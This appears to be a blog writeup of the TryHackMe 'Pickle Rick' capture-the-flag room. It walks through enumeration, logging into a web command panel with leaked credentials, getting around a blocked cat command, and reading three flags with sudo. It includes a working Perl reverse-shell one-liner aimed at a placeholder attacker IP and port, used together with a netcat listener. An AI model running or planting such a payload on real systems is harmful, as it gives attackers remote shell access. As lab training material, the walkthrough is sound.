+++
title = 'TryHackMe — Pickle Rick Writeup'
date = '2023-02-10'
draft = false
tags = ["TryHackMe", "Linux"]
summary = '“A Rick and Morty CTF. Help turn Rick back into a human!”'
[cover]
image = 'main.png'
+++

# Enumeration

Running an Nmap scan on the machine shows two open ports, **80** and **22**.

{{< figure src="image_1.png" align="center" >}}

Looking at the website doesn’t lead to anything interesting, but checking the source code gives us a username: **R1ckRul3s**.

{{< figure src="image_2.png" align="center" >}}

Checking the `robots.txt` of the site gives us this weird string, note it down.

{{< figure src="image_3.png" align="center" >}}

Through our web enumeration, we find the page `/login.php`, using the username and weird string we found, we can get access.

{{< figure src="image_4.png" align="center" >}}

We have initial access to the machine. Running `ls -la` shows us two interesting files:-
- Sup3rS3cretPickl3dIngred.txt
- clue.txt

{{< figure src="image_5.png" align="center" >}}

However, trying to cat the ingredient text file gives us an error.

> Hint: cat is blocked, but that doesn’t mean other commands are..

{{< figure src="image_6.png" align="center" >}}

Time to use a reverse shell!

# Getting the first flag
Some simple reverse shells can be found [here](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

Trying the bash reverse shell doesn’t work, but the Perl one does.

Remember to use your attack box’s IP address and choose a port.

```perl
perl -e 'use Socket;$i="ATTACKBOX_IP";$p=ATTACKBOX_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Start a netcat listener first.

{{< figure src="image_7.png" align="center" >}}

Then exploit the machine.

{{< figure src="image_8.png" align="center" >}}

Back to our Netcat listener, we have a shell.

{{< figure src="image_9.png" align="center" >}}

Let’s get the first flag.

{{< figure src="image_10.png" align="center" >}}

# Getting the second flag

Time to find the next flag, check `clue.txt`.

{{< figure src="image_11.png" align="center" >}}

Checking the `/home` directory, we can see a directory called `rick`. Which contains our second flag in `second ingredients`.

{{< figure src="image_12.png" align="center" >}}

# Getting the last flag

Digging around the system more, we find our last flag in `/root/3rd.txt`. Since we are sudoers, we can print out the file contents and get the third flag.

{{< figure src="image_13.png" align="center" >}}